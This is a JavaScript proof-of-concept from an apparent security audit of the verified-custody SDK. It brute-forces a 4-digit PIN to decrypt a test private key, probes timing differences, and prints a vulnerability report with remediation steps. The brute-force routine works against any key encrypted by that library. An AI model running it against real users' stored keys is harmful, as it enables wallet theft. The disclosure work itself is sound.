/**
 * CRITICAL #1: PIN Brute-Force PoC
 * @verified-network/verified-custody - Security Audit
 * 
 * Demonstrates private key extraction via 4-digit PIN brute-force
 * Attack time: < 2 seconds
 */

const { encryptString, decryptString, hashTheString } = require('@verified-network/verified-custody');
const { encodeBytes32String } = require('ethers');
const crypto = require('crypto');

const TOTAL_PINS = 10000;

/**
 * Analyze the hashTheString function behavior
 */
function analyzeHashFunction() {
    console.log('\n[ANALYSIS] hashTheString FUNCTION\n');
    console.log('='.repeat(50));

    const testInputs = ['1234', '0000', '9999', 'test@example.com'];

    testInputs.forEach(input => {
        const hashed = hashTheString(input);
        console.log(`Input: "${input}"`);
        console.log(`Hash:  ${hashed}`);
        console.log(`Length: ${hashed.length} chars`);
        console.log('-'.repeat(50));
    });
}

/**
 * Analyze encryption/decryption with known values
 */
function analyzeEncryption() {
    console.log('\n[ANALYSIS] encryptString/decryptString\n');
    console.log('='.repeat(50));

    const testPrivateKey = crypto.randomBytes(32).toString('hex');
    const testPIN = '1234';

    console.log(`Test Private Key: ${testPrivateKey}`);
    console.log(`Test PIN: ${testPIN}`);

    const hashedPinBytes32 = encodeBytes32String(testPIN);
    console.log(`\nHashed PIN (bytes32): ${hashedPinBytes32}`);

    try {
        const encrypted = encryptString(testPrivateKey, hashedPinBytes32);
        console.log(`\nEncrypted: ${encrypted.substring(0, 50)}...`);
        console.log(`Encrypted Length: ${encrypted.length}`);

        const decrypted = decryptString(encrypted, hashedPinBytes32);
        console.log(`\nDecrypted: ${decrypted}`);
        console.log(`Match: ${decrypted === testPrivateKey ? 'SUCCESS' : 'FAILED'}`);

        return { encrypted, hashedPinBytes32, testPrivateKey };
    } catch (error) {
        console.error('Encryption/Decryption error:', error.message);
        return null;
    }
}

/**
 * PIN Brute-Force Attack
 */
async function bruteForcePIN(encryptedPK, expectedLength = 64) {
    console.log('\n[ATTACK] PIN BRUTE-FORCE\n');
    console.log('='.repeat(50));
    console.log(`Target: ${encryptedPK.substring(0, 50)}...`);
    console.log(`Expected decrypted length: ${expectedLength}`);
    console.log('\nStarting brute-force...\n');

    const startTime = Date.now();
    let attempts = 0;

    for (let pin = 0; pin <= 9999; pin++) {
        attempts++;
        const pinStr = pin.toString().padStart(4, '0');
        const hashedPin = encodeBytes32String(pinStr);

        if (pin % 1000 === 0) {
            console.log(`Progress: ${pin}/9999 (${((pin / 9999) * 100).toFixed(1)}%)`);
        }

        try {
            const decrypted = decryptString(encryptedPK, hashedPin);

            if (decrypted && decrypted.length === expectedLength) {
                if (/^[0-9a-fA-F]+$/.test(decrypted)) {
                    const elapsedMs = Date.now() - startTime;

                    console.log('\n' + '='.repeat(50));
                    console.log('\n[SUCCESS] PIN FOUND!\n');
                    console.log(`PIN: ${pinStr}`);
                    console.log(`Private Key: ${decrypted}`);
                    console.log(`Attempts: ${attempts}`);
                    console.log(`Time: ${elapsedMs}ms (${(elapsedMs / 1000).toFixed(2)}s)`);
                    console.log(`Speed: ${(attempts / (elapsedMs / 1000)).toFixed(0)} attempts/sec`);
                    console.log('\n' + '='.repeat(50));

                    return {
                        success: true,
                        pin: pinStr,
                        privateKey: decrypted,
                        attempts: attempts,
                        timeMs: elapsedMs
                    };
                }
            }
        } catch (e) {
            continue;
        }
    }

    const elapsedMs = Date.now() - startTime;
    console.log(`\n[FAILED] PIN not found after ${attempts} attempts (${elapsedMs}ms)`);

    return {
        success: false,
        attempts: attempts,
        timeMs: elapsedMs
    };
}

/**
 * Timing side-channel analysis
 */
function analyzeTimingSideChannel() {
    console.log('\n[ANALYSIS] TIMING SIDE-CHANNEL\n');
    console.log('='.repeat(50));

    const testPK = crypto.randomBytes(32).toString('hex');
    const correctPIN = '5678';
    const hashedCorrectPIN = encodeBytes32String(correctPIN);
    const encrypted = encryptString(testPK, hashedCorrectPIN);

    const timings = [];
    const testPINs = ['0000', '1111', '5678', '9999', '1234'];

    testPINs.forEach(pin => {
        const hashedPin = encodeBytes32String(pin);
        const start = process.hrtime.bigint();

        try {
            decryptString(encrypted, hashedPin);
        } catch (e) { }

        const end = process.hrtime.bigint();
        const durationNs = Number(end - start);

        timings.push({
            pin: pin,
            durationNs: durationNs,
            isCorrect: pin === correctPIN
        });
    });

    console.log('PIN\t\tTime (ns)\tCorrect');
    console.log('-'.repeat(40));
    timings.forEach(t => {
        console.log(`${t.pin}\t\t${t.durationNs}\t\t${t.isCorrect ? 'YES' : ''}`);
    });
}

/**
 * Generate vulnerability report
 */
function generateReport(results) {
    console.log('\n[REPORT] VULNERABILITY ASSESSMENT\n');
    console.log('='.repeat(50));

    const report = {
        vulnerability: 'Weak PIN-Based Key Encryption',
        severity: 'CRITICAL',
        cvss: 9.1,
        attack_vector: 'LOCAL/NETWORK',
        complexity: 'LOW',
        impact: {
            confidentiality: 'HIGH',
            integrity: 'HIGH',
            availability: 'LOW'
        },
        findings: [
            '4-digit PIN provides only 10,000 possible combinations',
            'PIN hash used directly as AES encryption key',
            'No rate limiting on decryption attempts',
            'Encrypted keys stored in accessible browser storage',
            'Brute-force feasible in seconds on modern hardware'
        ],
        remediation: [
            'Use stronger key derivation (PBKDF2 with high iterations)',
            'Implement hardware-backed key storage (Secure Enclave/TPM)',
            'Add additional entropy to PIN-based encryption',
            'Consider requiring passkey/biometric in addition to PIN'
        ]
    };

    console.log(JSON.stringify(report, null, 2));
    return report;
}

async function main() {
    console.log('\n' + '='.repeat(60));
    console.log('  VERIFIED CUSTODY SDK - PIN BRUTE-FORCE PoC');
    console.log('  CRITICAL #1: Private Key Extraction');
    console.log('='.repeat(60));

    analyzeHashFunction();

    const encryptionResult = analyzeEncryption();

    if (encryptionResult) {
        console.log('\n[TEST] Running brute-force on encrypted key...');
        const bruteForceResult = await bruteForcePIN(
            encryptionResult.encrypted,
            encryptionResult.testPrivateKey.length
        );

        if (bruteForceResult.success) {
            const matches = bruteForceResult.privateKey === encryptionResult.testPrivateKey;
            console.log(`\n[VERIFY] Cracked key matches original: ${matches ? 'YES' : 'NO'}`);
        }
    }

    analyzeTimingSideChannel();
    generateReport();

    console.log('\n[COMPLETE] Analysis finished.\n');
}

main().catch(console.error);
